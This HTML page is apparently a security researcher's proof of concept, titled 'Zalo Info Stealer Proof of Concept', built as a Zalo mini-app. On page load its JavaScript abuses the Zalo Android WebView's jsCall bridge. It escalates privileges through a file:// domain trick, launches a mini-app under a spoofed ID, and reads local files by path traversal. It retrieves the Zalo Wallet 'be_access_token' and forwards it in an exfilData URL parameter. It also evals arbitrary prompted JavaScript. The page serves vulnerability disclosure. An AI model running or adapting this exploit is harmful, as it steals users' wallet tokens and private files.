<!DOCTYPE html>
<html id="VSRC-hmtl">
    <!-- Author: Sean Pesce -->
    <!-- WebView Analyzer modified to be used as a Zalo mini-app -->
    <head id="VSRC-head">
        <!-- <meta http-equiv="refresh" content="0; url=https://h5.zdn.vn/zapps/3888182390069527250"> -->
        <link rel="shortcut icon" id="VSRC-head-link-favicon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABBVBMVEU/UbU/UbQ/UbY+ULI/ULM+T7BAUrc+ULM7TKg+T7E8Tq0/ULQ9T687Tao/Urc+ULQ6SqQ4SJ5CVLxCVb5DVr9CVL0dJlQoNHRBVLtEV8I8Taw/UrZEV8M6SqYkL2kfJ1gSFzQAAAAKDRwYHkMmMW01RJc6S6hDVsA8TasmMW4dJVMMDyEIChcuO4QJDBoAAQEBAQMEBgwcJFA6S6c0Q5UZIUkHCRMBAgQcJVEjLWUvPIYGBxAKDR0BAQIDBAk3R54OEicCAgUpNXY5SaM8Ta0cJE8FBg0TGTYVGzszQZExP4wXHkMZIUhAU7k9T7A2RpxDVsFBVLwuO4I4SKFBU7tBU7r///9e5KOYAAAAAWJLR0RWCg3piQAAAAd0SU1FB+cGHgwIFs0EkqsAAAC6SURBVBjTY2BAAEYmZhYkLhMrIxs7BxOSACcXNw8vHwM/OyNMRECQh5GdQUiYjZ2ZEaSSkZGRTUSUQUycU0KSQUqagZ1NRkpWTp5BQVFJWUVVTZpBXUNTS1tHgUFXT1HfwNDI2MTUTFHR3MKSgdnK2sZW0U7W3sFR0VHRyZnBRc3Vzd3DU0Lay9vDzEfGl4HRz8+fPSCQTTYogD3YjwHoBibpECZ2dgY2CWamUGmIi7jBJDsDIzcDWQAAiSYStruNAvgAAAAldEVYdGRhdGU6Y3JlYXRlADIwMjMtMDYtMzBUMTI6MDg6MjIrMDA6MDDAnJm4AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDIzLTA2LTMwVDEyOjA4OjIyKzAwOjAwscEhBAAAACh0RVh0ZGF0ZTp0aW1lc3RhbXAAMjAyMy0wNi0zMFQxMjowODoyMiswMDowMObUANsAAAAASUVORK5CYII=">
        <title id="VSRC-head-title">WebView Analyzer </title>
        <!-- Zalo Mini-app stuff -->
        <meta id="VSRC-head-meta-zalo-miniapp-Content-Security-Policy" http-equiv="Content-Security-Policy" content="default-src * 'self' 'unsafe-inline' 'unsafe-eval' data: gap: content:">
        <meta id="VSRC-head-meta-zalo-miniapp-app-id" name="app-id" content="3888182390069527250" >
        <meta id="VSRC-head-meta-zalo-miniapp-version-id" name="version-id" content="422" >
        <meta id="VSRC-head-meta-zalo-miniapp-og-description" property="og:description" content="Zalo Mini-app Test" >
        <meta id="VSRC-head-meta-zalo-miniapp-og-url" property="og:url" content="https://h5.zdn.vn/zapps/3888182390069527250/" >
        <meta id="VSRC-head-meta-zalo-miniapp-og-image" property="og:image" content="//photo-logo-mapps.zadn.vn/2d2a6800cc45251b7c54.jpg" >
        <meta id="VSRC-head-meta-zalo-miniapp-og-image-url" property="og:image:url" content="//photo-logo-mapps.zadn.vn/2d2a6800cc45251b7c54.jpg" >
        <meta id="VSRC-head-meta-zalo-miniapp-keywords" name="keywords" content="Zalo Mini App" >
        <meta id="VSRC-head-meta-zalo-miniapp-index-version" name="index-version" content='12.6.1 - 9/11/2023, 17:21:07' >
        <meta id="VSRC-head-meta-zalo-miniapp-last-update-index" name="last-update-index" content="1700130601494" >
        <meta id="VSRC-head-meta-zalo-miniapp-Cache-Control" http-equiv="Cache-Control" content="max-age=0, no-store, must-revalidate" >
        <meta id="VSRC-head-meta-zalo-miniapp-Pragma" http-equiv="Pragma" content="no-cache" >
        <meta id="VSRC-head-meta-zalo-miniapp-Expires" http-equiv="Expires" content="0" >
        <meta id="VSRC-head-meta-zalo-miniapp-viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover" >
        <!-- Zalo Mini-app stuff -->

        <style id="VSRC-head-style">
body {
    font: normal 11px Verdana, Arial, sans-serif;
    padding: 20px;
}
pre {
    background-color: rgb(230, 230, 230);
    padding: 5px;
    overflow-x: auto;
}
        </style>
      <script id="VSRC-head-script-zalo-miniapp-module-js" type="module" src="./index.db2181b4.module.js"></script>
      <link id="VSRC-head-link-zalo-miniapp-modulepreload-js" rel="modulepreload" href="./vendor.5b99ea40.module.js">
      <link id="VSRC-head-link-zalo-miniapp-stylesheet-css" rel="stylesheet" href="./style.41b31ee3.css">
    </head>
    <body id="VSRC-body">
        <h2 id="VSRC-body-h2-title">Zalo Info Stealer Proof of Concept</h2>
        <div id="VSRC-body-div-errors" style="visibility: hidden">
            <h3 id="VSRC-body-div-h3-lbl-errors">Errors</h3>
            <pre id="VSRC-body-div-pre-data-errors" style="background-color: rgb(243, 228, 228);"> </pre>
        </div>
        <!-- Zalo Mini-app stuff -->
        <div id="app"></div>
        <!-- built script files will be auto injected -->
        
    </body>
    <footer id="VSRC-footer">
        <script id="VSRC-footer-script">

try {
// Constants & globals
var WEBVIEW_ANALYZER_DOM_ID_PREFIX = 'VSRC-';

// Utility functions
function webViewAnalyzerHtmlEscape(str) {
    if (str == null) {
        str = '';
    }
    return str.replace(/&/g, '&amp;').replace(/'/g, '&apos;').replace(/"/g, '&quot;').replace(/>/g, '&gt;').replace(/</g, '&lt;');
}



function setWebViewAnalysisData(idSuffix, data) {
    if (data == null) {
        data = '';
    }
    if (data === '') {
        data = ' '; // Make sure code block has non-zero height (for aesthetic purposes)
    }
    var el = document.getElementById(WEBVIEW_ANALYZER_DOM_ID_PREFIX+idSuffix);
    data = webViewAnalyzerHtmlEscape(data);
    el.innerHTML = data;
}

function webViewAnalyzerDisplayError(err) {
    try {
        document.getElementById(WEBVIEW_ANALYZER_DOM_ID_PREFIX+'body-div-errors').style.visibility = 'visible';
        setWebViewAnalysisData('body-div-pre-data-errors', err.toString());
    } catch (err2) {
        alert(err);
    }
}

// Execute the JavaScript code in the textarea
function webViewAnalyzerExecJs() {
    document.getElementById(WEBVIEW_ANALYZER_DOM_ID_PREFIX+'body-div-errors').style.visibility = 'hidden';
    setWebViewAnalysisData('body-div-pre-data-errors', ' ');
    var jsCode = document.getElementById(WEBVIEW_ANALYZER_DOM_ID_PREFIX+'body-div-textarea-data-exec-js').value;
    try {
        eval(jsCode);
    } catch (err) {
        webViewAnalyzerDisplayError(err);
    }
}




// Analysis code for Zalo stuff
function webviewAnalyzerZaloSleep(delayMs) {
    var stopTime = Date.now() + delayMs;
    while (Date.now() < stopTime) {
        // Do nothing; simply sleep
    }
}
function webviewAnalyzerZaloGetJsToken() {
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2){
            return parts.pop().split(';').shift();
        }
        return null;
    }
    var tok = getCookie(document.location.hostname+'_zlink3rd');
    if (tok == null || tok == '') {
        var queryString = window.location.search;
        var urlParams = new URLSearchParams(queryString);
        var tokParam = urlParams.get(ZaloJavaScriptInterface.SeanP.queryParamJsToken);
        if (tokParam) {
            tok = tokParam;
        }
    }
    return tok;
}
function webviewAnalyzerZaloGetQueryParam(param) {
    var queryString = window.location.search;
    var urlParams = new URLSearchParams(queryString);
    var paramVal = urlParams.get(''+param);
    return paramVal;
}
function webviewAnalyzerIsZaloWebView() {
    try {
        if (ZaloJavaScriptInterface != null && ZaloJavaScriptInterface.jsCall != null) {
            return true;
        }
    } catch (err) {
        console.log('Failed to find custom Zalo JavaScript API');
    }
    return false;
}
function webviewAnalyzerIsMPZaloWebView() {
    if (webviewAnalyzerIsZaloWebView()) {
        // return ZaloJavaScriptInterface.SeanP.isMPWebView();
        var queryString = window.location.search;
        var urlParams = new URLSearchParams(queryString);
        var mpWebViewParam = urlParams.get(ZaloJavaScriptInterface.SeanP.queryParamMpWebViewCanary);
        return (mpWebViewParam != null && mpWebViewParam != '');
    }
    return false;
}

function webviewAnalyzerZaloInit() {
    try {
        // var tok = webviewAnalyzerZaloGetJsToken();
        ZaloJavaScriptInterface.SeanP = {
            done: false,
            queryParamJsToken: 'tok',
            queryParamLocalFileRead: 'localFileRead',
            queryParamAppId: 'miniAppId',
            queryParamAppIdStart: 'miniAppIdStart',

            // Privilege escalation functionality
            getTargetPrivescDomain: function () {
                var queryString = window.location.search;
                var urlParams = new URLSearchParams(queryString);
                var targetDomainParam = urlParams.get('privescDomain');
                if (targetDomainParam == null || targetDomainParam == '') {
                    // Default to a known high-privilege domain
                    return 'h5.zdn.vn';
                }
                return targetDomainParam;
            },
            privescOperationResult: null,
            privescDomain: null,
            doPrivescCallback: function (msg) {
                ZaloJavaScriptInterface.SeanP.privescOperationResult = msg;
                var msgStr = ''+msg;
                if (msgStr.includes('error_code":0')) {
                    // Privilege escalation succeeded
                    ZaloJavaScriptInterface.SeanP.privescDomain = domain
                } else{
                    // Privesc failed
                    alert(msgStr);
                    ZaloJavaScriptInterface.SeanP.privescDomain = null;
                    //ZaloJavaScriptInterface.SeanP.privescOperationResult = null;
                }
            },
            doPrivescCheckCallback: function (msg) {
                ZaloJavaScriptInterface.SeanP.privescOperationResult = msg;
                var msgStr = ''+msg;
                alert(msgStr);
                if (msgStr.includes('error_code":0') && msgStr.includes('action.open.mp')) {
                    // Privilege escalation succeeded
                    ZaloJavaScriptInterface.SeanP.privescDomain = `${window.location.hostname}`;
                } else {
                    // Privesc failed
                }
            },
            doPrivesc: function (domain) {
                if (domain == null || (''+domain) == '') {
                    domain = 'h5.zdn.vn';
                }
                var token = webviewAnalyzerZaloGetJsToken();
                ZaloJavaScriptInterface.SeanP.privescOperationResult = null
                ZaloJavaScriptInterface.jsCall(token, 'action.open.inapprw', token, `{"url":"file://${domain}"}`, 'ZaloJavaScriptInterface.SeanP.doPrivescCallback');
                
                // while (!ZaloJavaScriptInterface.SeanP.isPrivesc()) {
                //     ZaloJavaScriptInterface.jsCall(webviewAnalyzerZaloGetJsToken(), 'action.get.supported.actions', '', '{}', 'ZaloJavaScriptInterface.SeanP.doPrivescCheckCallback');
                // }
                webviewAnalyzerZaloSleep(1000);
                ZaloJavaScriptInterface.SeanP.privescDomain = domain;
            },
            isPrivesc: function () {
                return ZaloJavaScriptInterface.SeanP.privescDomain != null;
            },

            // MPWebView functionality
            queryParamMpWebViewCanary: 'mpWebView',
            dismissMPLoadingViewResult: null,
            dismissMPLoadingViewCallback: function (msg) {
                ZaloJavaScriptInterface.SeanP.dismissMPLoadingViewResult = msg;
                alert(msg);
            },
            dismissMPLoadingView: function () {
                var token = webviewAnalyzerZaloGetJsToken();
                ZaloJavaScriptInterface.SeanP.dismissMPLoadingViewResult = null;
                ZaloJavaScriptInterface.jsCall(token, 'action.mp.close.loadingview', '', `{"at":${Date.now()},"when":"config done","url":"https://h5.zdn.vn/zapps/${ZaloJavaScriptInterface.SeanP.getTargetMiniAppId()}/?utm_source=zalo&utm_medium=zalo&utm_campaign=zalo&zarsrc=0"}`, 'ZaloJavaScriptInterface.SeanP.dismissMPLoadingViewCallback');
                // while (ZaloJavaScriptInterface.SeanP.dismissMPLoadingViewResult == null) {
                //     // Do nothing; wait for the operation to complete
                // }
                //webviewAnalyzerZaloSleep(1000);
                // Return whether the operation succeeded
                var result = ZaloJavaScriptInterface.SeanP.dismissMPLoadingViewResult;
                var success = (result == null ? '' : result+'').includes('error_code":0');
                // ZaloJavaScriptInterface.SeanP.dismissMPLoadingViewResult = null;
                return success;
            },

            getTargetMiniAppId: function () {
                var queryString = window.location.search;
                var urlParams = new URLSearchParams(queryString);
                var miniAppIdParam = urlParams.get(ZaloJavaScriptInterface.SeanP.queryParamAppId);
                if (miniAppIdParam == null || miniAppIdParam == '') {
                    // Default to the Zalo Mini-app App Store
                    return '2517980822879468590';
                }
                return miniAppIdParam;
            },
            getSpoofStartupMiniAppId: function () {
                var queryString = window.location.search;
                var urlParams = new URLSearchParams(queryString);
                var miniAppIdParam = urlParams.get(ZaloJavaScriptInterface.SeanP.queryParamAppIdStart);
                if (miniAppIdParam == null || miniAppIdParam == '') {
                    // Default to the main Mini-app ID
                    return ZaloJavaScriptInterface.SeanP.getTargetMiniAppId();
                }
                return miniAppIdParam;
            },
            toMiniAppResult: null,
            toMiniAppCallback: function (msg) {
                ZaloJavaScriptInterface.SeanP.toMiniAppResult = msg;
            },
            toMiniApp: function (miniAppId) {
                var token = webviewAnalyzerZaloGetJsToken();
                var startMiniAppId = null
                if (miniAppId == null) {
                    miniAppId = ZaloJavaScriptInterface.SeanP.getTargetMiniAppId();  // ID of the Mini-app whose privileges we want to obtain
                    startMiniAppId = ZaloJavaScriptInterface.SeanP.getSpoofStartupMiniAppId(); // Mini-app ID to use during the jsCall
                } else {
                    startMiniAppId = miniAppId;
                }
                var thisUrlNoScheme = `${window.location.hostname}${window.location.pathname}`;
                var localFileRead = webviewAnalyzerZaloGetQueryParam(ZaloJavaScriptInterface.SeanP.queryParamLocalFileRead);
                if (localFileRead != null && localFileRead != '') {
                    localFileRead = ZaloJavaScriptInterface.SeanP.queryParamLocalFileRead + '=' + encodeURIComponent(localFileRead) + '&';
                } else {
                    localFileRead = '';
                }
                var evilUrl = `${thisUrlNoScheme}?${ZaloJavaScriptInterface.SeanP.queryParamMpWebViewCanary}=1&${localFileRead}${ZaloJavaScriptInterface.SeanP.queryParamJsToken}=${encodeURIComponent(token)}&regexCaptureUrl=https://h5.zdn.vn/zapps/${miniAppId}`;
                ZaloJavaScriptInterface.SeanP.toMiniAppResult = null;
                ZaloJavaScriptInterface.jsCall(token, 'action.open.mp', token, `{"sourceOpen":1,"mpUrl":"${evilUrl}","mpInfo":{"appId":"${startMiniAppId}","appAvtUrl":"https://thonglol.github.io/load.png","appName":"myMiniProgram","appQRUrl":"https://thonglol.github.io/load.png","isDebugging":false},"config":{"shortcutUrl":"${evilUrl}","shareUrl":"${evilUrl}","appQRUrlForShare":"https://thonglol.github.io/load.png","appCategory":"appCategory","enableFavorite":true}}`, 'ZaloJavaScriptInterface.SeanP.toMiniAppCallback');
                // while (ZaloJavaScriptInterface.SeanP.toMiniAppResult == null) {
                //     // Do nothing; wait for the operation to complete
                // }
                //webviewAnalyzerZaloSleep(1000);
                // Return whether the operation succeeded
                var result = ZaloJavaScriptInterface.SeanP.toMiniAppResult;
                var success = (result == null ? '' : result+'').includes('error_code":0');
                // ZaloJavaScriptInterface.SeanP.toMiniAppResult = null;
                return success;
            },

            promptForJS: true,
            promptIsVisible: false,
            doPromptForJS: function () {
                if (!ZaloJavaScriptInterface.SeanP.promptForJS) {
                    return;
                }
                if (ZaloJavaScriptInterface.SeanP.promptIsVisible) {
                    return;
                }

                ZaloJavaScriptInterface.SeanP.promptIsVisible = true;
                var input = prompt('Enter JavaScript to execute ("STOP" to end prompts)', '');
                ZaloJavaScriptInterface.SeanP.promptIsVisible = false;
                if (input == 'STOP') {
                    ZaloJavaScriptInterface.SeanP.promptForJS = false;
                    return;
                }
                try {
                    eval(input);
                    document.getElementById(WEBVIEW_ANALYZER_DOM_ID_PREFIX+'body-div-errors').style.visibility = 'hidden';
                    setWebViewAnalysisData('body-div-pre-data-errors', ' ');
                } catch (err) {
                    alert(err);
                }
            },

            // Exploits
            readLocalReadResult: null,
            readLocalFile: function (fpath) {
                var fileUrl = `miniappres://files/MiniApp/${ZaloJavaScriptInterface.SeanP.getSpoofStartupMiniAppId()}/../../../../../../../${fpath}`;
                // var xhr = new XMLHttpRequest();
                // xhr.onreadystatechange = function () {
                //     if (xhr.readyState === 4) {
                //         ZaloJavaScriptInterface.SeanP.readLocalReadResult = xhr.responseText;
                //         alert(`Data from local file: ${fpath}\n` + ZaloJavaScriptInterface.SeanP.readLocalReadResult);
                //     }
                // }
                // xhr.open('GET', fileUrl, true);
                // xhr.send('');

                var iframe = document.createElement('iframe');
                iframe.src = fileUrl;
                iframe.id = 'VSRC-readLocalFileIframe';
                //iframe.style.display = 'none'  // Optional
                document.body.appendChild(iframe);
                iframe.onload = function() {
                    // Access the content of the iframe
                    var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
                    var iframeContent = iframeDocument.body.innerHTML;
                    ZaloJavaScriptInterface.SeanP.readLocalReadResult = iframeContent
                    alert(`Data from local file: ${fpath}\n` + ZaloJavaScriptInterface.SeanP.readLocalReadResult);
                };
            },
        };
        
        if (!webviewAnalyzerIsMPZaloWebView()) {
            // Do initial privesc
            if (!ZaloJavaScriptInterface.SeanP.isPrivesc()) {
                ZaloJavaScriptInterface.SeanP.doPrivesc(ZaloJavaScriptInterface.SeanP.getTargetPrivescDomain());
            }

            if (ZaloJavaScriptInterface.SeanP.isPrivesc()) {
                // If privilege escalation succeeded, transition to MPWebView

                // Check for parameter that prevents mini-app transition
                var queryString = window.location.search;
                var urlParams = new URLSearchParams(queryString);
                var cancelMiniAppParam = urlParams.get('noMiniApp');
                if (cancelMiniAppParam == null || cancelMiniAppParam == '') {
                    // Transition to MPWebView
                    //var miniAppTransitionSuccess = ZaloJavaScriptInterface.SeanP.toMiniApp();
                    
                } else {
                    // Cancelled mini-app transition via URL query parameter
                }
            }
            
        } else {
            var token = webviewAnalyzerZaloGetJsToken();

            // Try reading stored mini-app data
            var regexCaptureUrl = webviewAnalyzerZaloGetQueryParam('regexCaptureUrl');
            if (regexCaptureUrl.includes('2517980822879468590') /* Zalo Wallet Mini App ID */) {
                ZaloJavaScriptInterface.SeanP.infoStealCallback = function (msg) {
                    if (typeof(msg) == 'string') {
                        msg = JSON.parse(msg);
                    }
                    var msgStr = JSON.stringify(msg);
                    if (!msgStr.includes('"error_code":0')) {
                        // Error retrieving the data; display the error
                        alert(msgStr);
                        return;
                    }
                    var data = msg;
                    // data = atob(data);
                    // data = decodeURIComponent(data);
                    alert(JSON.stringify(data));
                    var toUrl = `${window.location.protocol}//${window.location.hostname}${window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'))}/infoparse.html?exfilData=${encodeURIComponent(JSON.stringify(data))}`;
                    var token = webviewAnalyzerZaloGetJsToken();
                    ZaloJavaScriptInterface.openLink(token, toUrl);
                    ZaloJavaScriptInterface.jsCall(token, 'action.window.close', '', '{}', 'alert');
                }
                ZaloJavaScriptInterface.jsCall(token, 'action.zbrowser.mpds', '', `{"mpds_action":"mpds.get","mpds_data":{"keys":["be_access_token"]},"appId":"2517980822879468590"}`, 'ZaloJavaScriptInterface.SeanP.infoStealCallback');

            } else {
                // Prompt for arbitrary JavaScript to execute
                setInterval(ZaloJavaScriptInterface.SeanP.doPromptForJS, 1000);
            }
            //ZaloJavaScriptInterface.jsCall(webviewAnalyzerZaloGetJsToken(), 'action.zbrowser.mpds', '', `{"mpds_action":"mpds.get","mpds_data":{"keys":["openedIds"]},"appId":"3888182390069527250"}`, 'alert');

            // @TODO: Test code, delete when done
            //setInterval(ZaloJavaScriptInterface.SeanP.doPromptForJS, 1000);
        }
    } catch (err) {
        alert(err);
    }
}
if (webviewAnalyzerIsZaloWebView()) {
    webviewAnalyzerZaloInit();

    if (!ZaloJavaScriptInterface.SeanP.done) {
        ZaloJavaScriptInterface.SeanP.done = true;
        ZaloJavaScriptInterface.SeanP.toMiniApp('2517980822879468590');
    }
} else {
    webViewAnalyzerDisplayError('This proof of concept should be opened within a Zalo Android app WebView.');
}

// End of analysis code for Zalo stuff



} catch (err) {
    // Catch and display all errors
    alert(err);
}

        </script>
    </footer>
</html>
